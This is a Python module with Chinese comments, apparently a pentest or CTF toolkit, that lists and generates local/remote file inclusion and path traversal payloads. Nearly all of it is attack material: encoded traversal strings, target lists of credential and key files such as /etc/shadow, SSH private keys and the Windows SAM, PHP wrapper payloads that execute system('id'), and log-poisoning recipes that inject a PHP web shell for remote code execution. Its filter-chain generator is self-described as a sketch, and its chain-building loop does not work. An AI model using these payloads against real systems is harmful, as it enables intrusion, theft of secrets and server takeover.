# -*- coding: utf-8 -*-
"""LFI / RFI / Path Traversal Payload 生成器.

覆盖:
    - 本地文件包含 (LFI)
    - 远程文件包含 (RFI)
    - 路径遍历 (Path Traversal)
    - PHP 伪协议 (php:// filter/wrapper/data/input)
    - 日志污染
    - /proc/self/environ 等技巧
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  路径遍历 Payload
# ═══════════════════════════════════════════════════════════

PATH_TRAVERSAL: List[str] = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",          # URL 编码
    "..%252f..%252f..%252fetc/passwd",    # 双 URL 编码
    "..\\/..\\/..\\/etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..;/..;/..;/etc/passwd",
    "....\\/....\\/....\\/etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd", # 宽字节
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Unicode 全角斜杠
]

WINDOWS_PATH_TRAVERSAL: List[str] = [
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\boot.ini",
    "..%5c..%5c..%5cWindows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "%SYSTEMROOT%\\win.ini",
]


# ═══════════════════════════════════════════════════════════
#  常见敏感文件
# ═══════════════════════════════════════════════════════════

SENSITIVE_FILES: Dict[str, List[str]] = {
    "Linux": [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
        "/etc/php/php.ini", "/etc/my.cnf",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/fd/0", "/proc/self/fd/1",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/home/*/.ssh/id_rsa", "/home/*/.ssh/authorized_keys",
        "/root/.ssh/id_rsa", "/root/.bash_history",
        "/flag", "/flag.txt", "/var/www/html/flag",
        "/app/flag", "/tmp/flag",
        ".env", ".git/config", ".git/HEAD",
        "config.php", "database.php", "wp-config.php",
        "/proc/self/cwd/flag.txt",
        "/proc/net/tcp", "/proc/net/udp",
    ],
    "Windows": [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini", "C:\\boot.ini",
        "C:\\xampp\\htdocs\\config.php",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\repair\\SAM",
        "flag.txt", "C:\\flag.txt",
    ],
}


# ═══════════════════════════════════════════════════════════
#  PHP 伪协议
# ═══════════════════════════════════════════════════════════

PHP_WRAPPERS: Dict[str, List[Dict[str, str]]] = {
    "文件读取": [
        {
            "name": "php://filter (读取源码)",
            "payload": "php://filter/convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter (无 base64 干扰)",
            "payload": "php://filter/read=convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter + 大小写绕过",
            "payload": "php://FilTer/convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter + 双重编码",
            "payload": "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php",
        },
        {
            "name": "php://filter + 字符串处理链",
            "payload": "php://filter/string.rot13/resource=index.php",
        },
        {
            "name": "php://filter 压缩链",
            "payload": "php://filter/zlib.deflate/resource=index.php",
        },
        {
            "name": "file:// 协议",
            "payload": "file:///etc/passwd",
        },
        {
            "name": "phar:// 协议",
            "payload": "phar://uploaded_file.jpg/shell.php",
        },
    ],
    "代码执行": [
        {
            "name": "data:// (纯文本)",
            "payload": "data://text/plain,<?php%20system('id');?>",
        },
        {
            "name": "data:// (base64)",
            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
        },
        {
            "name": "php://input (POST)",
            "payload": "php://input",
            "note": "POST body: <?php system('id');?>",
        },
        {
            "name": "expect:// (需要 pecl)",
            "payload": "expect://id",
        },
    ],
    "日志包含 → RCE": [
        {
            "name": "Apache access.log 污染",
            "payload": "/var/log/apache2/access.log",
            "note": "先发送带 <?php system($_GET[c]);?> 的请求, 再包含日志文件",
        },
        {
            "name": "nginx access.log 污染",
            "payload": "/var/log/nginx/access.log",
        },
        {
            "name": "/proc/self/environ (CGI)",
            "payload": "/proc/self/environ",
            "note": "在 User-Agent 中注入 PHP 代码",
        },
        {
            "name": "SSH auth.log 污染",
            "payload": "/var/log/auth.log",
            "note": "用 ssh '<?php system($_GET[c]);?>'@target 污染日志",
        },
    ],
}


# ═══════════════════════════════════════════════════════════
#  PHP Filter Chain (php_filter_chain_generator style)
# ═══════════════════════════════════════════════════════════

def generate_filter_chain(command: str, base: str = "index.php") -> str:
    """生成 PHP filter chain 用于 RCE.

    注意: 这是示意版本。完整版需要 PHP 代码配合 filter chain generator 工具。
    """
    php_code = f"<?php system('{command}');?>"
    encoded = php_code.encode().hex()
    chain_parts = []
    for i in range(0, len(encoded), 2):
        chain_parts.append(f"convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7")
    chain = "|".join(chain_parts)
    return f"php://filter/{chain}/resource={base}"


def get_path_traversal() -> List[str]:
    """获取路径遍历 Payload 列表."""
    return PATH_TRAVERSAL


def get_windows_paths() -> List[str]:
    """获取 Windows 路径遍历 Payload."""
    return WINDOWS_PATH_TRAVERSAL


def get_sensitive_files(os_type: str = "") -> dict:
    """获取常见敏感文件列表."""
    if os_type and os_type.capitalize() in SENSITIVE_FILES:
        return {os_type.capitalize(): SENSITIVE_FILES[os_type.capitalize()]}
    return SENSITIVE_FILES


def get_php_wrappers(category: str = "") -> dict:
    """获取 PHP 伪协议 Payload."""
    if category and category in PHP_WRAPPERS:
        return {category: PHP_WRAPPERS[category]}
    return PHP_WRAPPERS
